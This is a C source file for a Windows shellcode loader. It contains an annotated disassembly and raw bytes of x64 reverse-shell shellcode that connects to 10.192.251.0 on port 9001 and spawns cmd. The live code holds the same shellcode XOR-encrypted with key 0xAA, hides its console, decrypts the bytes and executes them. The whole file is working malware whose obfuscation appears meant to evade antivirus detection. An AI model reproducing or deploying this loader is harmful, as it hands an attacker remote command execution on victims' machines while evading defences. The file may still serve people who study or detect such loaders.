/*
 * 0:  fc                      cld
1:  48                      dec    eax
2:  83 e4 f0                and    esp,0xfffffff0
5:  e8 c0 00 00 00          call   0xca
a:  41                      inc    ecx
b:  51                      push   ecx
c:  41                      inc    ecx
d:  50                      push   eax
e:  52                      push   edx
f:  51                      push   ecx
10: 56                      push   esi
11: 48                      dec    eax
12: 31 d2                   xor    edx,edx
14: 65 48                   gs dec eax
16: 8b 52 60                mov    edx,DWORD PTR [edx+0x60]
19: 48                      dec    eax
1a: 8b 52 18                mov    edx,DWORD PTR [edx+0x18]
1d: 48                      dec    eax
1e: 8b 52 20                mov    edx,DWORD PTR [edx+0x20]
21: 48                      dec    eax
22: 8b 72 50                mov    esi,DWORD PTR [edx+0x50]
25: 48                      dec    eax
26: 0f b7 4a 4a             movzx  ecx,WORD PTR [edx+0x4a]
2a: 4d                      dec    ebp
2b: 31 c9                   xor    ecx,ecx
2d: 48                      dec    eax
2e: 31 c0                   xor    eax,eax
30: ac                      lods   al,BYTE PTR ds:[esi]
31: 3c 61                   cmp    al,0x61
33: 7c 02                   jl     0x37
35: 2c 20                   sub    al,0x20
37: 41                      inc    ecx
38: c1 c9 0d                ror    ecx,0xd
3b: 41                      inc    ecx
3c: 01 c1                   add    ecx,eax
3e: e2 ed                   loop   0x2d
40: 52                      push   edx
41: 41                      inc    ecx
42: 51                      push   ecx
43: 48                      dec    eax
44: 8b 52 20                mov    edx,DWORD PTR [edx+0x20]
47: 8b 42 3c                mov    eax,DWORD PTR [edx+0x3c]
4a: 48                      dec    eax
4b: 01 d0                   add    eax,edx
4d: 8b 80 88 00 00 00       mov    eax,DWORD PTR [eax+0x88]
53: 48                      dec    eax
54: 85 c0                   test   eax,eax
56: 74 67                   je     0xbf
58: 48                      dec    eax
59: 01 d0                   add    eax,edx
5b: 50                      push   eax
5c: 8b 48 18                mov    ecx,DWORD PTR [eax+0x18]
5f: 44                      inc    esp
60: 8b 40 20                mov    eax,DWORD PTR [eax+0x20]
63: 49                      dec    ecx
64: 01 d0                   add    eax,edx
66: e3 56                   jecxz  0xbe
68: 48                      dec    eax
69: ff c9                   dec    ecx
6b: 41                      inc    ecx
6c: 8b 34 88                mov    esi,DWORD PTR [eax+ecx*4]
6f: 48                      dec    eax
70: 01 d6                   add    esi,edx
72: 4d                      dec    ebp
73: 31 c9                   xor    ecx,ecx
75: 48                      dec    eax
76: 31 c0                   xor    eax,eax
78: ac                      lods   al,BYTE PTR ds:[esi]
79: 41                      inc    ecx
7a: c1 c9 0d                ror    ecx,0xd
7d: 41                      inc    ecx
7e: 01 c1                   add    ecx,eax
80: 38 e0                   cmp    al,ah
82: 75 f1                   jne    0x75
84: 4c                      dec    esp
85: 03 4c 24 08             add    ecx,DWORD PTR [esp+0x8]
89: 45                      inc    ebp
8a: 39 d1                   cmp    ecx,edx
8c: 75 d8                   jne    0x66
8e: 58                      pop    eax
8f: 44                      inc    esp
90: 8b 40 24                mov    eax,DWORD PTR [eax+0x24]
93: 49                      dec    ecx
94: 01 d0                   add    eax,edx
96: 66 41                   inc    cx
98: 8b 0c 48                mov    ecx,DWORD PTR [eax+ecx*2]
9b: 44                      inc    esp
9c: 8b 40 1c                mov    eax,DWORD PTR [eax+0x1c]
9f: 49                      dec    ecx
a0: 01 d0                   add    eax,edx
a2: 41                      inc    ecx
a3: 8b 04 88                mov    eax,DWORD PTR [eax+ecx*4]
a6: 48                      dec    eax
a7: 01 d0                   add    eax,edx
a9: 41                      inc    ecx
aa: 58                      pop    eax
ab: 41                      inc    ecx
ac: 58                      pop    eax
ad: 5e                      pop    esi
ae: 59                      pop    ecx
af: 5a                      pop    edx
b0: 41                      inc    ecx
b1: 58                      pop    eax
b2: 41                      inc    ecx
b3: 59                      pop    ecx
b4: 41                      inc    ecx
b5: 5a                      pop    edx
b6: 48                      dec    eax
b7: 83 ec 20                sub    esp,0x20
ba: 41                      inc    ecx
bb: 52                      push   edx
bc: ff e0                   jmp    eax
be: 58                      pop    eax
bf: 41                      inc    ecx
c0: 59                      pop    ecx
c1: 5a                      pop    edx
c2: 48                      dec    eax
c3: 8b 12                   mov    edx,DWORD PTR [edx]
c5: e9 57 ff ff ff          jmp    0x21
ca: 5d                      pop    ebp
cb: 49                      dec    ecx
cc: be 77 73 32 5f          mov    esi,0x5f327377
d1: 33 32                   xor    esi,DWORD PTR [edx]
d3: 00 00                   add    BYTE PTR [eax],al
d5: 41                      inc    ecx
d6: 56                      push   esi
d7: 49                      dec    ecx
d8: 89 e6                   mov    esi,esp
da: 48                      dec    eax
db: 81 ec a0 01 00 00       sub    esp,0x1a0
e1: 49                      dec    ecx
e2: 89 e5                   mov    ebp,esp
e4: 49                      dec    ecx
e5: bc 02 00 23 29          mov    esp,0x29230002
ea: c0 a8 9e 68 41 54 49    shr    BYTE PTR [eax+0x5441689e],0x49
f1: 89 e4                   mov    esp,esp
f3: 4c                      dec    esp
f4: 89 f1                   mov    ecx,esi
f6: 41                      inc    ecx
f7: ba 4c 77 26 07          mov    edx,0x726774c
fc: ff d5                   call   ebp
fe: 4c                      dec    esp
ff: 89 ea                   mov    edx,ebp
101:    68 01 01 00 00          push   0x101
106:    59                      pop    ecx
107:    41                      inc    ecx
108:    ba 29 80 6b 00          mov    edx,0x6b8029
10d:    ff d5                   call   ebp
10f:    50                      push   eax
110:    50                      push   eax
111:    4d                      dec    ebp
112:    31 c9                   xor    ecx,ecx
114:    4d                      dec    ebp
115:    31 c0                   xor    eax,eax
117:    48                      dec    eax
118:    ff c0                   inc    eax
11a:    48                      dec    eax
11b:    89 c2                   mov    edx,eax
11d:    48                      dec    eax
11e:    ff c0                   inc    eax
120:    48                      dec    eax
121:    89 c1                   mov    ecx,eax
123:    41                      inc    ecx
124:    ba ea 0f df e0          mov    edx,0xe0df0fea
129:    ff d5                   call   ebp
12b:    48                      dec    eax
12c:    89 c7                   mov    edi,eax
12e:    6a 10                   push   0x10
130:    41                      inc    ecx
131:    58                      pop    eax
132:    4c                      dec    esp
133:    89 e2                   mov    edx,esp
135:    48                      dec    eax
136:    89 f9                   mov    ecx,edi
138:    41                      inc    ecx
139:    ba 99 a5 74 61          mov    edx,0x6174a599
13e:    ff d5                   call   ebp
140:    48                      dec    eax
141:    81 c4 40 02 00 00       add    esp,0x240
147:    49                      dec    ecx
148:    b8 63 6d 64 00          mov    eax,0x646d63
14d:    00 00                   add    BYTE PTR [eax],al
14f:    00 00                   add    BYTE PTR [eax],al
151:    41                      inc    ecx
152:    50                      push   eax
153:    41                      inc    ecx
154:    50                      push   eax
155:    48                      dec    eax
156:    89 e2                   mov    edx,esp
158:    57                      push   edi
159:    57                      push   edi
15a:    57                      push   edi
15b:    4d                      dec    ebp
15c:    31 c0                   xor    eax,eax
15e:    6a 0d                   push   0xd
160:    59                      pop    ecx
161:    41                      inc    ecx
162:    50                      push   eax
163:    e2 fc                   loop   0x161
165:    66 c7 44 24 54 01 01    mov    WORD PTR [esp+0x54],0x101
16c:    48                      dec    eax
16d:    8d 44 24 18             lea    eax,[esp+0x18]
171:    c6 00 68                mov    BYTE PTR [eax],0x68
174:    48                      dec    eax
175:    89 e6                   mov    esi,esp
177:    56                      push   esi
178:    50                      push   eax
179:    41                      inc    ecx
17a:    50                      push   eax
17b:    41                      inc    ecx
17c:    50                      push   eax
17d:    41                      inc    ecx
17e:    50                      push   eax
17f:    49                      dec    ecx
180:    ff c0                   inc    eax
182:    41                      inc    ecx
183:    50                      push   eax
184:    49                      dec    ecx
185:    ff c8                   dec    eax
187:    4d                      dec    ebp
188:    89 c1                   mov    ecx,eax
18a:    4c                      dec    esp
18b:    89 c1                   mov    ecx,eax
18d:    41                      inc    ecx
18e:    ba 79 cc 3f 86          mov    edx,0x863fcc79
193:    ff d5                   call   ebp
195:    48                      dec    eax
196:    31 d2                   xor    edx,edx
198:    48                      dec    eax
199:    ff ca                   dec    edx
19b:    8b 0e                   mov    ecx,DWORD PTR [esi]
19d:    41                      inc    ecx
19e:    ba 08 87 1d 60          mov    edx,0x601d8708
1a3:    ff d5                   call   ebp
1a5:    bb f0 b5 a2 56          mov    ebx,0x56a2b5f0
1aa:    41                      inc    ecx
1ab:    ba a6 95 bd 9d          mov    edx,0x9dbd95a6
1b0:    ff d5                   call   ebp
1b2:    48                      dec    eax
1b3:    83 c4 28                add    esp,0x28
1b6:    3c 06                   cmp    al,0x6
1b8:    7c 0a                   jl     0x1c4
1ba:    80 fb e0                cmp    bl,0xe0
1bd:    75 05                   jne    0x1c4
1bf:    bb 47 13 72 6f          mov    ebx,0x6f721347
1c4:    6a 00                   push   0x0
1c6:    59                      pop    ecx
1c7:    41                      inc    ecx
1c8:    89 da                   mov    edx,ebx
1ca:    ff d5                   call   ebp*/

//IP:10.192.251.0 - 0x0ac0fb00
//PORT: 9001
//KEY: 0xAA 

/*unsigned char buf[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x23\x29\x0a\xc0\xfb\x00"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
*/

#include<stdio.h>
#include <string.h>

unsigned char encrypted_shellcode[] = "\x56\xe2\x29\x4e\x5a\x42\x6a\xaa\xaa\xaa\xeb\xfb\xeb\xfa\xf8\xfb\xfc\xe2\x9b\x78\xcf\xe2\x21\xf8\xca\xe2\x21\xf8\xb2\xe2\x21\xf8\x8a\xe2\x21\xd8\xfa\xe2\xa5\x1d\xe0\xe0\xe7\x9b\x63\xe2\x9b\x6a\x06\x96\xcb\xd6\xa8\x86\x8a\xeb\x6b\x63\xa7\xeb\xab\x6b\x48\x47\xf8\xeb\xfb\xe2\x21\xf8\x8a\x21\xe8\x96\xe2\xab\x7a\x21\x2a\x22\xaa\xaa\xaa\xe2\x2f\x6a\xde\xcd\xe2\xab\x7a\xfa\x21\xe2\xb2\xee\x21\xea\x8a\xe3\xab\x7a\x49\xfc\xe2\x55\x63\xeb\x21\x9e\x22\xe2\xab\x7c\xe7\x9b\x63\xe2\x9b\x6a\x06\xeb\x6b\x63\xa7\xeb\xab\x6b\x92\x4a\xdf\x5b\xe6\xa9\xe6\x8e\xa2\xef\x93\x7b\xdf\x72\xf2\xee\x21\xea\x8e\xe3\xab\x7a\xcc\xeb\x21\xa6\xe2\xee\x21\xea\xb6\xe3\xab\x7a\xeb\x21\xae\x22\xe2\xab\x7a\xeb\xf2\xeb\xf2\xf4\xf3\xf0\xeb\xf2\xeb\xf3\xeb\xf0\xe2\x29\x46\x8a\xeb\xf8\x55\x4a\xf2\xeb\xf3\xf0\xe2\x21\xb8\x43\xfd\x55\x55\x55\xf7\xe3\x14\xdd\xd9\x98\xf5\x99\x98\xaa\xaa\xeb\xfc\xe3\x23\x4c\xe2\x2b\x46\x0a\xab\xaa\xaa\xe3\x23\x4f\xe3\x16\xa8\xaa\x89\x83\xa0\x6a\x51\xaa\xeb\xfe\xe3\x23\x4e\xe6\x23\x5b\xeb\x10\xe6\xdd\x8c\xad\x55\x7f\xe6\x23\x40\xc2\xab\xab\xaa\xaa\xf3\xeb\x10\x83\x2a\xc1\xaa\x55\x7f\xfa\xfa\xe7\x9b\x63\xe7\x9b\x6a\xe2\x55\x6a\xe2\x23\x68\xe2\x55\x6a\xe2\x23\x6b\xeb\x10\x40\xa5\x75\x4a\x55\x7f\xe2\x23\x6d\xc0\xba\xeb\xf2\xe6\x23\x48\xe2\x23\x53\xeb\x10\x33\x0f\xde\xcb\x55\x7f\xe2\x2b\x6e\xea\xa8\xaa\xaa\xe3\x12\xc9\xc7\xce\xaa\xaa\xaa\xaa\xaa\xeb\xfa\xeb\xfa\xe2\x23\x48\xfd\xfd\xfd\xe7\x9b\x6a\xc0\xa7\xf3\xeb\xfa\x48\x56\xcc\x6d\xee\x8e\xfe\xab\xab\xe2\x27\xee\x8e\xb2\x6c\xaa\xc2\xe2\x23\x4c\xfc\xfa\xeb\xfa\xeb\xfa\xeb\xfa\xe3\x55\x6a\xeb\xfa\xe3\x55\x62\xe7\x23\x6b\xe6\x23\x6b\xeb\x10\xd3\x66\x95\x2c\x55\x7f\xe2\x9b\x78\xe2\x55\x60\x21\xa4\xeb\x10\xa2\x2d\xb7\xca\x55\x7f\x11\x5a\x1f\x08\xfc\xeb\x10\x0c\x3f\x17\x37\x55\x7f\xe2\x29\x6e\x82\x96\xac\xd6\xa0\x2a\x51\x4a\xdf\xaf\x11\xed\xb9\xd8\xc5\xc0\xaa\xf3\xeb\x23\x70\x55\x7f";
unsigned char key = 0xAA;

void xor_decrypt(unsigned char* data, size_t data_len, unsigned char key) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key;
    }
}


int main()
{
	FreeConsole();
	size_t shellcode_len = sizeof(encrypted_shellcode) - 1;
	xor_decrypt(encrypted_shellcode, shellcode_len, key);
	
	int (*ret)() = (int(*)())encrypted_shellcode;
	return ret();
}
